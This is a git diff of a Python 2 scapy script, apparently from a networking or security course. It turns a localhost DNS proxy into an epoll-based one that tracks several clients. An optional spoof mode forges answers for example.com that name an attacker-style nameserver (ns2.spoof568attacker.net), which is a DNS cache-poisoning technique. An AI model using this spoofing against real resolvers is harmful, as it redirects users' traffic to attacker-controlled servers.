@@ -1,6 +1,8 @@
 #!/usr/bin/env python2
 import argparse
+import select
 import socket
+
 from scapy.all import *
 
 
@@ -26,20 +28,23 @@ SPOOF = args.spoof_response
 proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 proxy_sock.bind(('127.0.0.1', port))
 
-origin_addr = None
+server_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+epoll = select.epoll()
+epoll.register(proxy_sock.fileno(), select.EPOLLIN)
+epoll.register(server_sock.fileno(), select.EPOLLIN)
+
+origin_addrs = dict()
 
 while True:
-    buf, addr = proxy_sock.recvfrom(BUF_SIZE)
-    if origin_addr is None:
-        origin_addr = addr
-
-    if addr[1] == dns_port:  # recved from dns server
-        proxy_sock.sendto(buf, origin_addr)
-        origin_addr = None
-    elif addr[1] == origin_addr[1]:  # recved from client
-        if SPOOF:
+    events = epoll.poll()
+    for fileno, event in events:
+        assert event & select.EPOLLIN != 0
+        if fileno == proxy_sock.fileno():
+            # From a client
+            buf, addr = proxy_sock.recvfrom(BUF_SIZE)
             parsed_request = DNS(buf)
-            if parsed_request.qd.qname == 'example.com.':
+            if SPOOF and parsed_request.qd.qname == 'example.com.':
                 response = DNS(id=parsed_request.id,
                                qr=1,
                                qd=parsed_request.qd,
@@ -54,10 +59,20 @@ while True:
                                          rdata="ns2.spoof568attacker.net.",
                                          type='NS')
                                ))
-                proxy_sock.sendto(bytes(response), origin_addr)
+                proxy_sock.sendto(bytes(response), addr)
                 origin_addr = None
-                continue
-
-        proxy_sock.sendto(buf, ('127.0.0.1', dns_port))
-    else:
-        raise Exception("received packet from unknown addr {}".format(addr))
+            else:
+                identifier = (parsed_request.qd.qname, parsed_request.id)
+                origin_addrs[identifier] = addr
+                server_sock.sendto(buf, ('127.0.0.1', dns_port))
+        elif fileno == server_sock.fileno():
+            # From the server
+            buf, addr = server_sock.recvfrom(BUF_SIZE)
+            parsed_request = DNS(buf)
+            identifier = (parsed_request.qd.qname, parsed_request.id)
+            if identifier in origin_addrs:
+                origin_addr = origin_addrs[identifier]
+                proxy_sock.sendto(buf, origin_addr)
+                del origin_addrs[identifier]
+            else:
+                print("untracked packet recv'd from dns server")
